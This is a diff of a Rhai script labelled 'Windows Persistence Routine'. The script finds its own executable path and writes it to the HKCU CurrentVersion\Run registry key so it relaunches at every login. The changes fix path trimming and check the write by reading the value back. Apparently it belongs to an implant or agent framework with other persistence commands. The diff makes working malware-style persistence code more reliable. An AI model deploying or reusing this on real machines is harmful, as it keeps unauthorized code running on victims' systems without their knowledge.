@@ -1,3 +1,5 @@
+// Deprecated: superseded by auto_persist.rhai and the native persist:*
+// commands, which cover Windows, Linux, and macOS. Kept for compatibility.
 print_log("Starting Windows Persistence Routine...");
 
 // 1. Locate Self
@@ -8,11 +10,10 @@ let raw_path = exec_os(get_path_cmd);
 // Debugging: Print exactly what we got (surrounded by brackets to see whitespace)
 print_log("Raw Output: [" + raw_path + "]");
 
-// 2. Clean the Path (Manual Trim)
-// We remove Carriage Returns (\r) and Newlines (\n) manually to be safe
-let self_path = raw_path;
-self_path.replace("\r", "");
-self_path.replace("\n", "");
+// 2. Clean the Path
+// Rhai strings are immutable; trim() returns a new string that must be
+// assigned back, otherwise the CRLF stays embedded in the value below.
+let self_path = raw_path.trim();
 
 // Additional check: If the path is empty or obviously wrong
 if self_path.len < 3 {
@@ -35,8 +36,11 @@ print_log("Executing Registry Add...");
 let result = exec_os(cmd);
 
 // 5. Verification
-if result.contains("success") || result.contains("0") {
+// Read the value back through the native registry API and compare it to
+// exactly what we meant to write. "reg add" output alone is not proof.
+let written = internal_reg_read("HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", value_name);
+if written == self_path {
     return "[SUCCESS] Registry key added.\nKey: " + reg_key + "\nValue: " + value_name + "\nTarget: " + self_path;
 } else {
-    return "[FAILURE] Registry update failed.\nCommand Output: " + result;
+    return "[FAILURE] Registry update failed.\nRead-back: " + written + "\nCommand Output: " + result;
 }
